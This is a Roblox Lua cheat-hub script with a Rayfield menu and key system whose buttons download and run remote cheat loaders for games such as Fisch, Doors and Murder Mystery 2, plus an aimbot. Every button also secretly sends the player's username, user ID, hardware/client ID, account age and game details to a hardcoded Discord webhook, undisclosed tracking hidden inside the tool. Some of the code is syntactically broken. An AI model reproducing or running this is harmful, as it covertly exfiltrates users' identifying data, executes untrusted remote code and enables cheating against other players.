local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
    Name = "Shots Hub (By Shots Dunkx)",
    Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
    LoadingTitle = "Shots Interface Suite",
    LoadingSubtitle = "by Shots Dunkx",
    Theme = "Bloom", -- Check https://docs.sirius.menu/rayfield/configuration/themes
 
    DisableRayfieldPrompts = false,
    DisableBuildWarnings = false, -- Prevents Rayfield from warning when the script has a version mismatch with the interface
 
    ConfigurationSaving = {
       Enabled = true,
       FolderName = nil, -- Create a custom folder for your hub/game
       FileName = "Shots Hub"
    },
 
    Discord = {
       Enabled = true, -- Prompt the user to join your Discord server if their executor supports it
       Invite = "M2vCtc33v4", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ ABCD would be ABCD
       RememberJoins = true -- Set this to false to make them join the discord every time they load it up
    },
 
    KeySystem = true, -- Set this to true to use our key system
    KeySettings = {
       Title = "Untitled",
       Subtitle = "Key System",
       Note = "join discord.gg/M2vCtc33v4", -- Use this to tell the user how to get a key
       FileName = "Rizz", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
       SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
       GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
       Key = {"H1KbYIxHcZdb7isO6NErDmA6SNv3zg"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
    }
 })

 local Tab = Window:CreateTab("Fisch", 4483362458) -- Title, Image

 local Button = Tab:CreateButton({
    Name = "Fisch",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Script-Games/main/Fisch.lua"))()
        local HttpService = game:GetService("HttpService")
local Webhook_URL = "https://discord.com/api/webhooks/1356772670040969368/KSPlP9tAvg-32DP8_JvBjJpmShjS3J9-nwq26dQSCkdw9ePT9C5QhQKacqA7Uq3_0xds"
 
local player = game.Players.LocalPlayer
local playerName = player.Name
local displayName = player.DisplayName
local userId = player.UserId
local accountAge = player.AccountAge
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 
local premiumStatus = player.MembershipType == Enum.MembershipType.Premium and "Yes" or "No"
local playerCountry = game:GetService("LocalizationService").SystemLocaleId
local platform = player.OsPlatform or "Unknown"
local startTime = tick()
local placeId = game.PlaceId
local jobId = game.JobId
local gameName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name
 
local function getInGameTime()
    return math.floor(tick() - startTime) .. " seconds"
end
 
local payload = {
    ["content"] = "",
    ["embeds"] = {{
        ["title"] = "**Script Execution Notification**",
        ["description"] = displayName .. " (" .. playerName .. ") has executed fisch.",
        ["type"] = "rich",
        ["color"] = tonumber(0xffffff),
        ["fields"] = {
            {
                ["name"] = "User ID",
                ["value"] = userId,
                ["inline"] = true
            },
            {
                ["name"] = "Display Name",
                ["value"] = displayName,
                ["inline"] = true
            },
            {
                ["name"] = "Account Age",
                ["value"] = accountAge .. " days",
                ["inline"] = true
            },
            {
                ["name"] = "Premium Member",
                ["value"] = premiumStatus,
                ["inline"] = true
            },
            {
                ["name"] = "Hardware ID",
                ["value"] = hwid,
                ["inline"] = true
            },
            {
                ["name"] = "Platform",
                ["value"] = platform,
                ["inline"] = true
            },
            {
                ["name"] = "In-Game Time",
                ["value"] = getInGameTime(),
                ["inline"] = true
            },
            {
                ["name"] = "Place ID",
                ["value"] = placeId,
                ["inline"] = true
            },
            {
                ["name"] = "Game Name",
                ["value"] = gameName,
                ["inline"] = true
            },
            {
                ["name"] = "Job ID",
                ["value"] = jobId,
                ["inline"] = true
            }
        }
    }}
}
 
http_request({
    Url = Webhook_URL,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = HttpService:JSONEncode(payload)


local Tab = Window:CreateTab("Doors", 4483362458) -- Title, Image

 local Button = Tab:CreateButton({
    Name = "Doors",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/DarkDoorsKing/Clinet/main/DoorsRank"))()
        local HttpService = game:GetService("HttpService")
local Webhook_URL = "https://discord.com/api/webhooks/1356772670040969368/KSPlP9tAvg-32DP8_JvBjJpmShjS3J9-nwq26dQSCkdw9ePT9C5QhQKacqA7Uq3_0xds"
 
local player = game.Players.LocalPlayer
local playerName = player.Name
local displayName = player.DisplayName
local userId = player.UserId
local accountAge = player.AccountAge
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 
local premiumStatus = player.MembershipType == Enum.MembershipType.Premium and "Yes" or "No"
local playerCountry = game:GetService("LocalizationService").SystemLocaleId
local platform = player.OsPlatform or "Unknown"
local startTime = tick()
local placeId = game.PlaceId
local jobId = game.JobId
local gameName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name
 
local function getInGameTime()
    return math.floor(tick() - startTime) .. " seconds"
end
 
local payload = {
    ["content"] = "",
    ["embeds"] = {{
        ["title"] = "**Script Execution Notification**",
        ["description"] = displayName .. " (" .. playerName .. ") has executed Doors.",
        ["type"] = "rich",
        ["color"] = tonumber(0xffffff),
        ["fields"] = {
            {
                ["name"] = "User ID",
                ["value"] = userId,
                ["inline"] = true
            },
            {
                ["name"] = "Display Name",
                ["value"] = displayName,
                ["inline"] = true
            },
            {
                ["name"] = "Account Age",
                ["value"] = accountAge .. " days",
                ["inline"] = true
            },
            {
                ["name"] = "Premium Member",
                ["value"] = premiumStatus,
                ["inline"] = true
            },
            {
                ["name"] = "Hardware ID",
                ["value"] = hwid,
                ["inline"] = true
            },
            {
                ["name"] = "Platform",
                ["value"] = platform,
                ["inline"] = true
            },
            {
                ["name"] = "In-Game Time",
                ["value"] = getInGameTime(),
                ["inline"] = true
            },
            {
                ["name"] = "Place ID",
                ["value"] = placeId,
                ["inline"] = true
            },
            {
                ["name"] = "Game Name",
                ["value"] = gameName,
                ["inline"] = true
            },
            {
                ["name"] = "Job ID",
                ["value"] = jobId,
                ["inline"] = true
            }
        }
    }}
}
 
http_request({
    Url = Webhook_URL,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = HttpService:JSONEncode(payload)
})

    end,
 })

local Tab = Window:CreateTab("Dead Rails", 4483362458) -- Title, Image

 local Button = Tab:CreateButton({
    Name = "Load Dead Rails Script",
    Callback = function()
        loadstring(game:HttpGet:("https://raw.githubusercontent.com/AhmadV99/Script-Games/refs/heads/main/Dead%20Rails.lua"))()
        local HttpService = game:GetService("HttpService")
local Webhook_URL = "https://discord.com/api/webhooks/1356772670040969368/KSPlP9tAvg-32DP8_JvBjJpmShjS3J9-nwq26dQSCkdw9ePT9C5QhQKacqA7Uq3_0xds"
 
local player = game.Players.LocalPlayer
local playerName = player.Name
local displayName = player.DisplayName
local userId = player.UserId
local accountAge = player.AccountAge
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 
local premiumStatus = player.MembershipType == Enum.MembershipType.Premium and "Yes" or "No"
local playerCountry = game:GetService("LocalizationService").SystemLocaleId
local platform = player.OsPlatform or "Unknown"
local startTime = tick()
local placeId = game.PlaceId
local jobId = game.JobId
local gameName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name
 
local function getInGameTime()
    return math.floor(tick() - startTime) .. " seconds"
end
 
local payload = {
    ["content"] = "",
    ["embeds"] = {{
        ["title"] = "**Script Execution Notification**",
        ["description"] = displayName .. " (" .. playerName .. ") has executed Dead Rails.",
        ["type"] = "rich",
        ["color"] = tonumber(0xffffff),
        ["fields"] = {
            {
                ["name"] = "User ID",
                ["value"] = userId,
                ["inline"] = true
            },
            {
                ["name"] = "Display Name",
                ["value"] = displayName,
                ["inline"] = true
            },
            {
                ["name"] = "Account Age",
                ["value"] = accountAge .. " days",
                ["inline"] = true
            },
            {
                ["name"] = "Premium Member",
                ["value"] = premiumStatus,
                ["inline"] = true
            },
            {
                ["name"] = "Hardware ID",
                ["value"] = hwid,
                ["inline"] = true
            },
            {
                ["name"] = "Platform",
                ["value"] = platform,
                ["inline"] = true
            },
            {
                ["name"] = "In-Game Time",
                ["value"] = getInGameTime(),
                ["inline"] = true
            },
            {
                ["name"] = "Place ID",
                ["value"] = placeId,
                ["inline"] = true
            },
            {
                ["name"] = "Game Name",
                ["value"] = gameName,
                ["inline"] = true
            },
            {
                ["name"] = "Job ID",
                ["value"] = jobId,
                ["inline"] = true
            }
        }
    }}
}
 
http_request({
    Url = Webhook_URL,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = HttpService:JSONEncode(payload)
})

    end,
 })



 local Tab = Window:CreateTab("Boxing Beta! 🥊", 4483362458) -- Title, Image

 local Button = Tab:CreateButton({
    Name = "Boxing Beta! 🥊",
    Callback = function()
        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/255ac567ced3dcb9e69aa7e44c423f19.lua"))()
        local HttpService = game:GetService("HttpService")
local Webhook_URL = "https://discord.com/api/webhooks/1356772670040969368/KSPlP9tAvg-32DP8_JvBjJpmShjS3J9-nwq26dQSCkdw9ePT9C5QhQKacqA7Uq3_0xds"
 
local player = game.Players.LocalPlayer
local playerName = player.Name
local displayName = player.DisplayName
local userId = player.UserId
local accountAge = player.AccountAge
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 
local premiumStatus = player.MembershipType == Enum.MembershipType.Premium and "Yes" or "No"
local playerCountry = game:GetService("LocalizationService").SystemLocaleId
local platform = player.OsPlatform or "Unknown"
local startTime = tick()
local placeId = game.PlaceId
local jobId = game.JobId
local gameName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name
 
local function getInGameTime()
    return math.floor(tick() - startTime) .. " seconds"
end
 
local payload = {
    ["content"] = "",
    ["embeds"] = {{
        ["title"] = "**Script Execution Notification**",
        ["description"] = displayName .. " (" .. playerName .. ") has executed Boxing Beta!.",
        ["type"] = "rich",
        ["color"] = tonumber(0xffffff),
        ["fields"] = {
            {
                ["name"] = "User ID",
                ["value"] = userId,
                ["inline"] = true
            },
            {
                ["name"] = "Display Name",
                ["value"] = displayName,
                ["inline"] = true
            },
            {
                ["name"] = "Account Age",
                ["value"] = accountAge .. " days",
                ["inline"] = true
            },
            {
                ["name"] = "Premium Member",
                ["value"] = premiumStatus,
                ["inline"] = true
            },
            {
                ["name"] = "Hardware ID",
                ["value"] = hwid,
                ["inline"] = true
            },
            {
                ["name"] = "Platform",
                ["value"] = platform,
                ["inline"] = true
            },
            {
                ["name"] = "In-Game Time",
                ["value"] = getInGameTime(),
                ["inline"] = true
            },
            {
                ["name"] = "Place ID",
                ["value"] = placeId,
                ["inline"] = true
            },
            {
                ["name"] = "Game Name",
                ["value"] = gameName,
                ["inline"] = true
            },
            {
                ["name"] = "Job ID",
                ["value"] = jobId,
                ["inline"] = true
            }
        }
    }}
}
 
http_request({
    Url = Webhook_URL,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = HttpService:JSONEncode(payload)
})

    end,
 })

local Tab = Window:CreateTab("Basketball Zero", 4483362458) -- Title, Image

 local Button = Tab:CreateButton({
    Name = "Load Basketball Zero Script",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/roscripts749/loader/refs/heads/main/loader"))()
        local HttpService = game:GetService("HttpService")
local Webhook_URL = "https://discord.com/api/webhooks/1356772670040969368/KSPlP9tAvg-32DP8_JvBjJpmShjS3J9-nwq26dQSCkdw9ePT9C5QhQKacqA7Uq3_0xds"
 
local player = game.Players.LocalPlayer
local playerName = player.Name
local displayName = player.DisplayName
local userId = player.UserId
local accountAge = player.AccountAge
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 
local premiumStatus = player.MembershipType == Enum.MembershipType.Premium and "Yes" or "No"
local playerCountry = game:GetService("LocalizationService").SystemLocaleId
local platform = player.OsPlatform or "Unknown"
local startTime = tick()
local placeId = game.PlaceId
local jobId = game.JobId
local gameName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name
 
local function getInGameTime()
    return math.floor(tick() - startTime) .. " seconds"
end
 
local payload = {
    ["content"] = "",
    ["embeds"] = {{
        ["title"] = "**Script Execution Notification**",
        ["description"] = displayName .. " (" .. playerName .. ") has executed Basketball Zero!.",
        ["type"] = "rich",
        ["color"] = tonumber(0xffffff),
        ["fields"] = {
            {
                ["name"] = "User ID",
                ["value"] = userId,
                ["inline"] = true
            },
            {
                ["name"] = "Display Name",
                ["value"] = displayName,
                ["inline"] = true
            },
            {
                ["name"] = "Account Age",
                ["value"] = accountAge .. " days",
                ["inline"] = true
            },
            {
                ["name"] = "Premium Member",
                ["value"] = premiumStatus,
                ["inline"] = true
            },
            {
                ["name"] = "Hardware ID",
                ["value"] = hwid,
                ["inline"] = true
            },
            {
                ["name"] = "Platform",
                ["value"] = platform,
                ["inline"] = true
            },
            {
                ["name"] = "In-Game Time",
                ["value"] = getInGameTime(),
                ["inline"] = true
            },
            {
                ["name"] = "Place ID",
                ["value"] = placeId,
                ["inline"] = true
            },
            {
                ["name"] = "Game Name",
                ["value"] = gameName,
                ["inline"] = true
            },
            {
                ["name"] = "Job ID",
                ["value"] = jobId,
                ["inline"] = true
            }
        }
    }}
}
 
http_request({
    Url = Webhook_URL,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = HttpService:JSONEncode(payload)
})

    end,
 })

local Tab = Window:CreateTab("MM2", 4483362458) -- Title, Image

 local Button = Tab:CreateButton({
    Name = "Load Murder Mystery 2 Script",
    Callback = function()
        loadstring(game:GetObjects("rbxassetid://4001118261")[1].Source)()
        local HttpService = game:GetService("HttpService")
local Webhook_URL = "https://discord.com/api/webhooks/1356772670040969368/KSPlP9tAvg-32DP8_JvBjJpmShjS3J9-nwq26dQSCkdw9ePT9C5QhQKacqA7Uq3_0xds"
 
local player = game.Players.LocalPlayer
local playerName = player.Name
local displayName = player.DisplayName
local userId = player.UserId
local accountAge = player.AccountAge
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 
-- Additional Information
local premiumStatus = player.MembershipType == Enum.MembershipType.Premium and "Yes" or "No"
local playerCountry = game:GetService("LocalizationService").SystemLocaleId
local platform = player.OsPlatform or "Unknown"
local startTime = tick()
local placeId = game.PlaceId
local jobId = game.JobId
local gameName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name

local function getInGameTime()
    return math.floor(tick() - startTime) .. " seconds"
end
 
local payload = {
    ["content"] = "",
    ["embeds"] = {{
        ["title"] = "**Script Execution Notification**",
        ["description"] = displayName .. " (" .. playerName .. ") has executed Murder Mystery 2.",
        ["type"] = "rich",
        ["color"] = tonumber(0xffffff),
        ["fields"] = {
            {
                ["name"] = "User ID",
                ["value"] = userId,
                ["inline"] = true
            },
            {
                ["name"] = "Display Name",
                ["value"] = displayName,
                ["inline"] = true
            },
            {
                ["name"] = "Account Age",
                ["value"] = accountAge .. " days",
                ["inline"] = true
            },
            {
                ["name"] = "Premium Member",
                ["value"] = premiumStatus,
                ["inline"] = true
            },
            {
                ["name"] = "Hardware ID",
                ["value"] = hwid,
                ["inline"] = true
            },
            {
                ["name"] = "Platform",
                ["value"] = platform,
                ["inline"] = true
            },
            {
                ["name"] = "In-Game Time",
                ["value"] = getInGameTime(),
                ["inline"] = true
            },
            {
                ["name"] = "Place ID",
                ["value"] = placeId,
                ["inline"] = true
            },
            {
                ["name"] = "Game Name",
                ["value"] = gameName,
                ["inline"] = true
            },
            {
                ["name"] = "Job ID",
                ["value"] = jobId,
                ["inline"] = true
            }
        }
    }}
}
 
http_request({
    Url = Webhook_URL,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = HttpService:JSONEncode(payload)
})

    end,
 })








local Tab = Window:CreateTab("Train To Fight", 4483362458) -- Title, Image

 local Button = Tab:CreateButton({
    Name = "Load Train To Fight Script",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Jonthedruger/gg/refs/heads/main/traintofight.lua",true))()
        local HttpService = game:GetService("HttpService")
local Webhook_URL = "https://discord.com/api/webhooks/1356772670040969368/KSPlP9tAvg-32DP8_JvBjJpmShjS3J9-nwq26dQSCkdw9ePT9C5QhQKacqA7Uq3_0xds"
 
local player = game.Players.LocalPlayer
local playerName = player.Name
local displayName = player.DisplayName
local userId = player.UserId
local accountAge = player.AccountAge
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 
-- Additional Information
local premiumStatus = player.MembershipType == Enum.MembershipType.Premium and "Yes" or "No"
local playerCountry = game:GetService("LocalizationService").SystemLocaleId
local platform = player.OsPlatform or "Unknown"
local startTime = tick()
local placeId = game.PlaceId
local jobId = game.JobId
local gameName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name
 
-- Function to calculate in-game time since the script was executed
local function getInGameTime()
    return math.floor(tick() - startTime) .. " seconds"
end
 
local payload = {
    ["content"] = "",
    ["embeds"] = {{
        ["title"] = "**Script Execution Notification**",
        ["description"] = displayName .. " (" .. playerName .. ") has executed Train To Fight.",
        ["type"] = "rich",
        ["color"] = tonumber(0xffffff),
        ["fields"] = {
            {
                ["name"] = "User ID",
                ["value"] = userId,
                ["inline"] = true
            },
            {
                ["name"] = "Display Name",
                ["value"] = displayName,
                ["inline"] = true
            },
            {
                ["name"] = "Account Age",
                ["value"] = accountAge .. " days",
                ["inline"] = true
            },
            {
                ["name"] = "Premium Member",
                ["value"] = premiumStatus,
                ["inline"] = true
            },
            {
                ["name"] = "Hardware ID",
                ["value"] = hwid,
                ["inline"] = true
            },
            {
                ["name"] = "Platform",
                ["value"] = platform,
                ["inline"] = true
            },
            {
                ["name"] = "In-Game Time",
                ["value"] = getInGameTime(),
                ["inline"] = true
            },
            {
                ["name"] = "Place ID",
                ["value"] = placeId,
                ["inline"] = true
            },
            {
                ["name"] = "Game Name",
                ["value"] = gameName,
                ["inline"] = true
            },
            {
                ["name"] = "Job ID",
                ["value"] = jobId,
                ["inline"] = true
            }
        }
    }}
}
 
http_request({
    Url = Webhook_URL,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = HttpService:JSONEncode(payload)
})

    end,
 })



 local Tab = Window:CreateTab("Basketball Legends🏀", 4483362458) -- Title, Image

 local Button = Tab:CreateButton({
    Name = "Load Basketball Legends Script",
    Callback = function()
        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/dcddaca948ce72ba6e50443c1f68b47d.lua"))()
        local HttpService = game:GetService("HttpService")
local Webhook_URL = "https://discord.com/api/webhooks/1356772670040969368/KSPlP9tAvg-32DP8_JvBjJpmShjS3J9-nwq26dQSCkdw9ePT9C5QhQKacqA7Uq3_0xds"
 
local player = game.Players.LocalPlayer
local playerName = player.Name
local displayName = player.DisplayName
local userId = player.UserId
local accountAge = player.AccountAge
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 
local premiumStatus = player.MembershipType == Enum.MembershipType.Premium and "Yes" or "No"
local playerCountry = game:GetService("LocalizationService").SystemLocaleId
local platform = player.OsPlatform or "Unknown"
local startTime = tick()
local placeId = game.PlaceId
local jobId = game.JobId
local gameName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name
 
local function getInGameTime()
    return math.floor(tick() - startTime) .. " seconds"
end
 
local payload = {
    ["content"] = "",
    ["embeds"] = {{
        ["title"] = "**Script Execution Notification**",
        ["description"] = displayName .. " (" .. playerName .. ") has executed Basketball Legends.",
        ["type"] = "rich",
        ["color"] = tonumber(0xffffff),
        ["fields"] = {
            {
                ["name"] = "User ID",
                ["value"] = userId,
                ["inline"] = true
            },
            {
                ["name"] = "Display Name",
                ["value"] = displayName,
                ["inline"] = true
            },
            {
                ["name"] = "Account Age",
                ["value"] = accountAge .. " days",
                ["inline"] = true
            },
            {
                ["name"] = "Premium Member",
                ["value"] = premiumStatus,
                ["inline"] = true
            },
            {
                ["name"] = "Hardware ID",
                ["value"] = hwid,
                ["inline"] = true
            },
            {
                ["name"] = "Platform",
                ["value"] = platform,
                ["inline"] = true
            },
            {
                ["name"] = "In-Game Time",
                ["value"] = getInGameTime(),
                ["inline"] = true
            },
            {
                ["name"] = "Place ID",
                ["value"] = placeId,
                ["inline"] = true
            },
            {
                ["name"] = "Game Name",
                ["value"] = gameName,
                ["inline"] = true
            },
            {
                ["name"] = "Job ID",
                ["value"] = jobId,
                ["inline"] = true
            }
        }
    }}
}
 
http_request({
    Url = Webhook_URL,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = HttpService:JSONEncode(payload)
})

        loadstring(game:HttpGet(loadstring(game:HttpGet('https://raw.githubusercontent.com/HexFG/duckhub/refs/heads/main/loader.lua'))()))()
    end,
 })


 local Tab = Window:CreateTab("Chicblocko", 4483362458) -- Title, Image

 local Button = Tab:CreateButton({
    Name = "Aimbot",
    Callback = function()
        local HttpService = game:GetService("HttpService")
local Webhook_URL = "https://discord.com/api/webhooks/1356772670040969368/KSPlP9tAvg-32DP8_JvBjJpmShjS3J9-nwq26dQSCkdw9ePT9C5QhQKacqA7Uq3_0xds"
 
local player = game.Players.LocalPlayer
local playerName = player.Name
local displayName = player.DisplayName
local userId = player.UserId
local accountAge = player.AccountAge
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 
-- Additional Information
local premiumStatus = player.MembershipType == Enum.MembershipType.Premium and "Yes" or "No"
local playerCountry = game:GetService("LocalizationService").SystemLocaleId
local platform = player.OsPlatform or "Unknown"
local startTime = tick()
local placeId = game.PlaceId
local jobId = game.JobId
local gameName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name
 
-- Function to calculate in-game time since the script was executed
local function getInGameTime()
    return math.floor(tick() - startTime) .. " seconds"
end
 
local payload = {
    ["content"] = "",
    ["embeds"] = {{
        ["title"] = "**Script Execution Notification**",
        ["description"] = displayName .. " (" .. playerName .. ") has executed chicblocko.",
        ["type"] = "rich",
        ["color"] = tonumber(0xffffff),
        ["fields"] = {
            {
                ["name"] = "User ID",
                ["value"] = userId,
                ["inline"] = true
            },
            {
                ["name"] = "Display Name",
                ["value"] = displayName,
                ["inline"] = true
            },
            {
                ["name"] = "Account Age",
                ["value"] = accountAge .. " days",
                ["inline"] = true
            },
            {
                ["name"] = "Premium Member",
                ["value"] = premiumStatus,
                ["inline"] = true
            },
            {
                ["name"] = "Hardware ID",
                ["value"] = hwid,
                ["inline"] = true
            },
            {
                ["name"] = "Platform",
                ["value"] = platform,
                ["inline"] = true
            },
            {
                ["name"] = "In-Game Time",
                ["value"] = getInGameTime(),
                ["inline"] = true
            },
            {
                ["name"] = "Place ID",
                ["value"] = placeId,
                ["inline"] = true
            },
            {
                ["name"] = "Game Name",
                ["value"] = gameName,
                ["inline"] = true
            },
            {
                ["name"] = "Job ID",
                ["value"] = jobId,
                ["inline"] = true
            }
        }
    }}
}
 
http_request({
    Url = Webhook_URL,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = HttpService:JSONEncode(payload)
})

        -- CODED BY WINDOWSDRIVERKIT
 
getgenv().Aimbot = {
    Status = true,
    Keybind  = 'C',
    Hitpart = 'HumanoidRootPart',
    ['Prediction'] = {
        X = 0.165,
        Y = 0.1,
    },
}
 
if getgenv().AimbotRan then
    return
else
    getgenv().AimbotRan = true
end
-- make it reexecutable to update settings
 
 
local RunService = game:GetService('RunService')
local Workspace = game:GetService('Workspace')
local Players = game:GetService('Players')
 
local LocalPlayer = Players.LocalPlayer
local Camera = Workspace.CurrentCamera
local Mouse = LocalPlayer:GetMouse()
 
local Player = nil -- Our target player
 
 
local GetClosestPlayer = function() -- // Optimized GetClosestPlayer i believe?
    local ClosestDistance, ClosestPlayer = 100000, nil
    for _, Player : Player in pairs(Players:GetPlayers()) do
        if Player.Name ~= LocalPlayer.Name and Player.Character and Player.Character:FindFirstChild('HumanoidRootPart') then
            local Root, Visible = Camera:WorldToScreenPoint(Player.Character.HumanoidRootPart.Position)
            if not Visible then
                continue
            end
            Root = (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(Root.X, Root.Y)).Magnitude
            if Root < ClosestDistance then
                ClosestPlayer = Player
                ClosestDistance = Root
            end
        end
    end
    return ClosestPlayer
end
 
Mouse.KeyDown:Connect(function(key) -- Get our closest player (toggle)
    if key == Aimbot.Keybind:lower() then
        Player = not Player and GetClosestPlayer() or nil
    end
end)
 
RunService.RenderStepped:Connect(function()
    if not Player then
        return
    end
    if not Aimbot.Status then
        return
    end
    local Hitpart = Player.Character:FindFirstChild(Aimbot.Hitpart)
    if not Hitpart then
        return
    end
    Camera.CFrame = CFrame.new(Camera.CFrame.Position, Hitpart.Position + Hitpart.Velocity * Vector3.new(Aimbot.Prediction.X, Aimbot.Prediction.Y, Aimbot.Prediction.X))
end)
    end,
 })
